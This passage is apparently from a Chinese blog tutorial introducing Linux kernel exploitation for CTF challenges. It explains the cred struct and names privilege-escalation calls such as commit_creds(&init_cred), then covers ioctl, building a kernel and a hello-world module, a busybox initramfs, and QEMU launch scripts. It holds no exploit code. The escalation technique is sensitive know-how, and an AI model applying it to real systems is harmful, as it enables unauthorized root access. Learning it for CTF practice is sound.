*/</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
<p>我们主要关注各种id，这些字段用于定义任务的身份，并与权限检查密切相关。</p>
<ul>
<li><strong><code>kuid_t uid</code> 和 <code>kgid_t gid</code></strong><ul>
<li>真实用户 ID (<code>uid</code>) 和真实组 ID (<code>gid</code>)。</li>
<li>定义进程创建时的原始身份，通常由父进程继承。</li>
</ul>
</li>
<li><strong><code>kuid_t suid</code> 和 <code>kgid_t sgid</code></strong><ul>
<li>保存的用户 ID 和保存的组 ID。</li>
<li>用于暂时切换身份后恢复原始身份，常用于 SUID/SGID 程序。</li>
</ul>
</li>
<li><strong><code>kuid_t euid</code> 和 <code>kgid_t egid</code></strong><ul>
<li>有效用户 ID 和有效组 ID。</li>
<li>实际权限检查使用的身份，与真实身份不同的场景通常出现在提权操作中。</li>
</ul>
</li>
<li><strong><code>kuid_t fsuid</code> 和 <code>kgid_t fsgid</code></strong><ul>
<li>文件系统操作使用的用户 ID 和组 ID。</li>
<li>通常用于文件访问权限的检查。</li>
</ul>
</li>
</ul>
<p>一个进程的权限是由位于内核空间的 <code>cred</code> 结构体进行管理的，那么我们不难想到：只要改变一个进程的 <code>cred</code> 结构体，就能改变其执行权限。</p>
<p>在内核空间有如下两个函数，都位于 <code>kernel/cred.c</code> 中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的 cred 结构体，并返回一个新的 cred 结构体，需要注意的是 daemon 参数应为有效的进程描述符地址。如果传递的 <code>daemon</code> 参数为 <code>NULL</code>，则创建一个默认的 <code>cred</code>，通常用于与 <code>init</code> 进程（PID 1）关联的场景，较新版内核会直接返回错误。</li>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的 cred 结构体应用到进程。</li>
</ul>
<p>一般可以用<code>prepare_kernel_cred</code>先获取一个合法的cred结构体，然后更改里面的权限位后，再<code>commit_creds</code>应用到进程进行提权。但实际上在较新版的内核中，一般是直接改cred结构体，或是改task_struct的cred指针，抑或是调用<code>commit_creds(&amp;init_cred)</code>，来将具有root权限的init进程的cred结构体拷贝到我们当前进程。</p>
<h5 id="可装载内核模块"><a href="#可装载内核模块" class="headerlink" title="可装载内核模块"></a><strong>可装载内核模块</strong></h5><p><strong>LKMs</strong> 全称 <strong>Loadable Kernel Modules</strong>，即<strong>可加载内核模块</strong>。它是一种可以在运行中的内核中动态加载或卸载的模块化代码。LKMs 为操作系统内核提供了灵活性，使其能够根据需要添加或移除功能，而无需重新编译或重启内核。</p>
<p>常见的 LKMs 包括：</p>
<ul>
<li>驱动程序（Device drivers）<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>…</li>
</ul>
</li>
<li>内核扩展模块 (modules)</li>
</ul>
<p>一般ctf题中，漏洞都是存在在<strong>.ko</strong>文件中，也就是<strong>LKM</strong>中。</p>
<p><strong>相关指令</strong></p>
<ul>
<li><strong>insmod</strong>: 讲指定模块加载到内核中</li>
<li><strong>rmmod</strong>: 从内核中卸载指定模块</li>
<li><strong>lsmod</strong>: 列出已经加载的模块</li>
<li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li>
</ul>
<h5 id="内核交互"><a href="#内核交互" class="headerlink" title="内核交互"></a>内核交互</h5><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p>
<blockquote>
<p>在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和 <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p>
</blockquote>
<p><code>ioctl</code> 是 Linux 和类 Unix 操作系统中用于设备控制的系统调用（system call）。它全称是 <strong>Input/Output Control</strong>，主要用于对设备执行特殊操作或者控制设备的行为，这些操作通常无法通过标准的读（<code>read</code>）、写（<code>write</code>）系统调用完成。</p>
<p><strong>基本用法</strong></p>
<p>典型的 <code>ioctl</code> 原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>fd</code></strong>: 文件描述符，表示目标设备或文件。</li>
<li><strong><code>request</code></strong>: 请求码，用于指定具体的控制操作。</li>
<li><strong><code>...</code></strong>: 可选参数，通常是指向内存中数据的指针，具体取决于请求的操作。</li>
</ul>
<p><strong>常见用途</strong></p>
<ol>
<li><strong>设备配置</strong>：设置设备参数（例如网络设备的 IP 地址、串口波特率）。</li>
<li><strong>信息查询</strong>：获取设备的状态、硬件信息等。</li>
<li><strong>非标准 I/O 操作</strong>：执行驱动中特殊的读写行为。</li>
<li><strong>硬件控制</strong>：控制底层硬件设备，例如磁盘分区管理。</li>
</ol>
<p><strong>示例代码</strong></p>
<p>一个简单的例子是设置终端属性：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">term</span>;</span></span><br><span class="line">    <span class="type">int</span> fd = <span class="number">0</span>; <span class="comment">// 通常 0 表示标准输入（终端）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, TCGETS, &amp;term) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;终端配置已成功获取\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>TCGETS</code></strong>: 获取终端的当前配置。</li>
<li><strong><code>struct termios</code></strong>: 存储终端配置的结构体。</li>
</ul>
<p><strong>请求码的构造</strong></p>
<p><code>ioctl</code> 请求码通常用四部分组成：</p>
<ul>
<li><strong>类型</strong>：表示设备类型，例如磁盘、终端。</li>
<li><strong>编号</strong>：特定命令的编号。</li>
<li><strong>方向</strong>：表示是读、写还是两者皆有。</li>
<li><strong>大小</strong>：与之交互的数据大小。</li>
</ul>
<p>宏 <strong><code>_IO</code>、<code>_IOR</code>、<code>_IOW</code> 和 <code>_IOWR</code></strong> 常被用于生成请求码。</p>
<ul>
<li><code>_IO</code>：无数据传输。</li>
<li><code>_IOR</code>：数据从内核传输到用户空间（读）。</li>
<li><code>_IOW</code>：数据从用户空间传输到内核（写）。</li>
<li><code>_IOWR</code>：双向传输（读写）。</li>
</ul>
<p><strong>注意事项</strong></p>
<ol>
<li><strong>设备驱动依赖</strong>：<code>ioctl</code> 的功能完全由设备驱动程序实现，不同设备可能有不同的控制请求。</li>
<li><strong>安全性问题</strong>：由于 <code>ioctl</code> 可以直接操作设备，对参数的检查不足可能会带来漏洞，尤其是在权限提升攻击中。</li>
</ol>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><h5 id="下载内核"><a href="#下载内核" class="headerlink" title="下载内核"></a>下载内核</h5><p><a class="link"   href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" >清华源镜像站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>下列步骤如果确信来源可靠的话，可以略过中间签名验证的三步。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.15.153.tar.xz		<span class="comment">#可以选择自己想要的对应版本</span></span><br><span class="line">unxz linux-5.4.98.tar.xz	<span class="comment">#解压</span></span><br><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.15.153.tar.sign	<span class="comment">#下载签名</span></span><br><span class="line">gpg --locate-keys gregkh@kernel.org		<span class="comment">#导入内核版本发布者的公钥。</span></span><br><span class="line">gpg --verify linux-5.15.153.tar.sign		<span class="comment">#验证签名</span></span><br><span class="line">tar -xf linux-5.15.153.tar		<span class="comment">#解压得到源码</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250112233721560.png"
                      class=""
                >
<p>然后配置内核的编译选项，可以用menuconfig来可视化配置。如果想要非交互式，直接调整 <code>.config</code> 文件或使用以下命令生成默认配置：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#默认配置</span></span><br><span class="line">make defconfig</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可视化自定义配置</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install libncurses-dev</span><br><span class="line"><span class="built_in">sudo</span> apt install flex</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113003141550.png"
                      class=""
                >
<p>这里我们主要关注调试方面的选项，依次进入到 Kernel hacking -&gt; Compile-time checks and compiler options，然后勾选如下选项<code>Compile the kernel with debug info</code>，以便于调试。</p>
<p>如果要使用 kgdb 调试内核，则需要选中 <code>KGDB: kernel debugger</code>，并选中 KGDB 下的所有选项。这里我试了下，linux-5.4.98这个版本有KGDB选项，而linux-5.15.153这个版本就没这个选项了，据说是默认开启。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004218124.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004304194.png"
                      class=""
                >
<h5 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h5><p>编译内核前需要准备一些工具。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install build-essential libncurses-dev bison flex libssl-dev libelf-dev bc</span><br></pre></td></tr></table></figure></div>
<p>编译内核镜像，可以根据机器的核数来选择具体使用多少核来编译内核。这里我们将标准错误重定向到日志中看看。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nproc</span>		<span class="comment">#查看自己主机有多少核</span></span><br><span class="line">make -j$(<span class="built_in">nproc</span>) bzImage 2&gt; build_error.log		<span class="comment">#-jn就是指定用n核进行并行编译，直接指定为nproc全速运行进行编译</span></span><br></pre></td></tr></table></figure></div>
<p>编译时我遇到了以下错误：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">make[<span class="number">2</span>]: *** No rule to make target <span class="string">&#x27;net/netfilter/xt_TCPMSS.o&#x27;</span>, needed by <span class="string">&#x27;net/netfilter/built-in.a&#x27;</span>.  Stop.</span><br><span class="line">make[<span class="number">2</span>]: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br><span class="line">make[<span class="number">1</span>]: *** [scripts/Makefile.build:<span class="number">552</span>: net/netfilter] Error <span class="number">2</span></span><br><span class="line">make[<span class="number">1</span>]: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br><span class="line">make: *** [Makefile:<span class="number">1907</span>: net] Error <span class="number">2</span></span><br><span class="line">make: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br></pre></td></tr></table></figure></div>
<p>根据<a class="link"   href="https://bbs.t-firefly.com/forum.php?mod=viewthread&amp;tid=1826这篇求助帖，发现问题大概是我们的文件系统大小写敏感，而`net/netfilter/`目录下只有`xt_tcpmss.c`这个文件。这里我们把其改名为`xt_TCPMSS.c`试试。然后最后出现如下提示，则编译成功。" >https://bbs.t-firefly.com/forum.php?mod=viewthread&amp;tid=1826这篇求助帖，发现问题大概是我们的文件系统大小写敏感，而`net/netfilter/`目录下只有`xt_tcpmss.c`这个文件。这里我们把其改名为`xt_TCPMSS.c`试试。然后最后出现如下提示，则编译成功。<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113223946647.png"
                      class=""
                >
<h5 id="编译内核驱动"><a href="#编译内核驱动" class="headerlink" title="编译内核驱动"></a>编译内核驱动</h5><h6 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h6><p>这里我们以自己编译一个输出Hello World的内核驱动模块为例。</p>
<p>因为我所用的环境是vscode，而windows上的环境没有几个内核的头文件，所以我们要配置wsl远程开发。</p>
<p>安装 WSL 后：</p>
<ol>
<li>在 VSCode 中安装 <a class="link"   href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-wsl" >Remote - WSL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 插件。</li>
<li>点击 VSCode 左下角绿色的“打开远程窗口”图标，选择 “WSL: New Window”，进入到 WSL 环境的文件系统。</li>
<li>确保在 WSL 中设置好文件路径共享，通过 <code>/mnt/c</code> 可直接访问 Windows 文件。</li>
</ol>
<p>在 WSL 中，可以直接开发和测试内核模块。具体代码实现如下。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//myko.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">//包含与内核相关的基本功能和工具，比如 printk 函数，用于向内核日志打印消息。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">//定义了 module_init 和 module_exit 宏，这些用于指定模块的入口和退出函数。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">//包含定义 Linux 内核模块所需的基础结构，例如 MODULE_LICENSE 宏。</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明模块的许可证。内核需要知道你的模块是开源的还是闭源的。这里说明可以用 BSD 或 GPL 任一许可证。</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);	</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(<span class="string">&quot;Hello, world!\n&quot;</span>);		<span class="comment">//类似于用户态的 printf，但它打印的信息会进入内核日志而不是终端。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(<span class="string">&quot;Goodbye, cruel world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_init);		<span class="comment">//注册模块的初始化函数，告诉内核加载模块时应调用 my_init。</span></span><br><span class="line">module_exit(my_exit);		<span class="comment">//注册模块的清理函数，告诉内核卸载模块时应调用 my_exit。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h6 id="加载模块"><a href="#加载模块" class="headerlink" title="加载模块"></a>加载模块</h6><p>先创建Makefile以便编译我们写好的内核驱动模块。</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /mnt/e/ctf/kernel/linux-5.15.153</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">moduels_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></div>
<p><code>obj-m</code>:</p>
<p> 指定需要编译的模块目标文件，这里是 <code>myko.ko</code>，源文件为 <code>myko.c</code>。</p>
<p><code>KERNELDR</code>:</p>
<p> 定义内核源码路径，需要提供一个完整内核源码树。此目录必须配置了编译环境和内核头文件。</p>
<p><code>PWD</code>:</p>
<p> 当前模块源代码的路径（<code>pwd</code> 命令的输出），在编译内核模块时会作为参数传递给内核构建系统。</p>
<p><code>modules</code>:</p>
<p>调用内核的构建系统，执行模块编译。</p>
<ul>
<li><code>-C $(KERNELDR)</code>: 切换到内核源码目录并使用它的 Makefile。</li>
<li><code>M=$(PWD)</code>: 指定模块代码所在的目录，内核会到这里查找模块代码并编译。</li>
</ul>
<p><code>modules_install</code>:<br>安装编译完成的模块（<code>myko.ko</code>）到系统指定的模块目录（通常是 <code>/lib/modules/$(uname -r)/</code>）。</p>
<p><code>clean</code>:<br>清除临时文件、编译生成的中间文件（<code>.o</code>、<code>.ko</code>、<code>.mod.c</code> 等）。</p>
<p>然后在终端make即可获取到myko.ko。可能会遇到以下错误：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230522662.png"
                      class=""
                >
<p>可以先在我们编译好的kernel目录下执行<code>make modules_prepare</code>重新加载符号表。然后就只会报warning而不会直接Error退出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230655614.png"
                      class=""
                >
<p>这里还是缺少符号文件。我们先忽略。</p>
<p>然后我们想要通过已经编译好的内核，起一个虚拟环境，以测试自己写好的模块。首先我们安装BusyBox以快速新建一个根文件系统。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install busybox</span><br></pre></td></tr></table></figure></div>
<p>然后按以下方式新建根文件系统，用的是busybox。将一些常用指令创建链接到busybox，busybox会根据指令类型自动执行对应指令。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件结构</span></span><br><span class="line"><span class="built_in">mkdir</span> -p bin dev etc lib proc sys tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 busybox</span></span><br><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> busybox) ./bin</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line"><span class="built_in">ln</span> -s busybox sh</span><br><span class="line"><span class="built_in">ln</span> -s busybox init</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建简单的 init 脚本</span></span><br><span class="line"><span class="built_in">cat</span> &gt; init &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#!/bin/sh</span></span><br><span class="line"><span class="string">mount -t proc none /proc</span></span><br><span class="line"><span class="string">mount -t sysfs none /sys</span></span><br><span class="line"><span class="string">mount -t devtmpfs none /dev</span></span><br><span class="line"><span class="string">exec /bin/sh</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">chmod</span> +x init</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc | gzip &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure></div>
<p>执行完以上命令后，我们就得到了<code>initramfs.cpio.gz</code>这样一个文件系统，然后我们可以用qemu虚拟机起虚拟环境。先写一个sh脚本。其中用到了qemu虚拟机，所以我们要先进行安装。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install qemu-system-x86</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#run.sh</span></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 earlyprintk=serial debug panic=0&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -kernel <span class="string">&quot;/mnt/e/ctf/kernel/linux-5.15.153/arch/x86/boot/bzImage&quot;</span> \</span><br><span class="line">    -initrd <span class="string">&quot;./initramfs.cpio&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>然而一跑直接报错，执行不了/init。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114004241555.png"
                      class=""
                >
<p>这里搞了半天，甚至拿正常题目给的cpio文件系统能够进入内核正确执行。最后发现问题所在，是因为我们用系统自带的包管理器下载的busybox是动态编译的，所以在我们虚拟的环境里，没有配置动态链接库，也就执行不了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114145451508.png"
                      class=""
                >
<p>那么我们可以从<a class="link"   href="https://busybox.net/" >官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载源码，然后自己指定静态编译。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-01-14-000023.png"
                      class=""
                >
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">make -j3</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>然后就能在项目根目录获取到一个静态编译的busybox，把这个busybox扔到我们待打包成文件系统的bin目录下。之后就能正常运行了。有了busybox，我们就可以把一些常用指令都扔去。这里可以写个脚本，把busybox支持的所有指令都给放到bin目录下。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> initramfs/bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> $(busybox --list); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">ln</span> -sf busybox <span class="variable">$cmd</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>
<p>然后对文件系统进行打包，解压。最后run一下看看能不能正常启动。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc | gzip &gt; ../initramfs.cpio.gz</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">gunzip initramfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151349527.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151546880.png"
                      class=""
                >
<p>现在已经能启动了，不过tty出现了问题，但不影响我们对内核的模块进行测试。然后我们就可以把之前编译好的<strong>myko.ko</strong>扔到虚拟的文件系统里，重新打包一次并运行。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> myko.ko ./initramfs/myko.ko</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">find . | cpio -o --format=newc  &gt; ../initramfs.cpio</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure></div>
<p>然后我们就可以装载模块，出现Hello，world！说明正确导入了内核的扩展模块。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114153803147.png"
                      class=""
                >
<h5 id="题目提供环境"><a href="#题目提供环境" class="headerlink" title="题目提供环境"></a>题目提供环境</h5><p>一般kernel pwn题会给出以下几种类型的文件。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">xxx.sh		<span class="comment">//启动脚本</span></span><br><span class="line">bzImage		<span class="comment">//内核脚本</span></span><br><span class="line">xxx.cpio	<span class="comment">//文件系统</span></span><br><span class="line">xxx.ko		<span class="comment">//内核模块文件，相当于用户模式的.so动态链接库</span></span><br></pre></td></tr></table></figure></div>
<p><strong>内核镜像分类</strong></p>
<ul>
<li>vmlinux：原始内核文件</li>
</ul>
<p>在当前目录下提取到 vmlinux  ，为编译出来的原始内核文件。</p>
<ul>
<li>bzImage：压缩内核镜像</li>
</ul>
<p>在当前目录下的 arch/x86/boot/ 目录下提取到 bzImage ，为压缩后的内核文件，适用于大内核。</p>
<ul>
<li>zImage &amp;&amp; bzImage</li>
</ul>
<p>zImage 是 vmlinux 经过gzip压缩后的文件。bzImage 中的 bz 表示“big zImage”。bzImage 不是用 bzip2 压缩，而是要偏移到一个位置，使用 gzip 压缩。两者的不同之处在于，zImage 解压缩内核到低端内存(第一个 640K)，bzImage 解压缩内核到高端内存(1M 以上)。如果内核比较小，那么采用 zImage 或 bzImage 都行，如果比较大应该用 bzImage 。</p>
<p>其中我们来看看<code>xxx.sh</code>分析一下启动的过程。</p>
<p>如在<strong>DSBCTF-EasyKernel</strong>这个题中，其提供了3个文件。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111221325011.png"
                      class=""
                >
<p>run.sh中的内容如下：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><strong>-cpu kvm64</strong></p>
<p>指定虚拟机的 CPU 类型为 <code>kvm64</code>。kvm64是 QEMU 提供的一个优化 CPU 类型，它专为 KVM 提供虚拟化支持。如果运行环境支持 KVM，则可以获得硬件加速。此选项对需要模拟 CPU 特性的程序（如针对 CPU 指令的漏洞开发）特别有用。</p>
<p><strong>-m 256</strong></p>
<p>设置虚拟机内存大小为 <strong>256 MB</strong>。可以根据需要调整这个数值来分配更多或更少的内存。</p>
<p><strong>-nographic</strong></p>
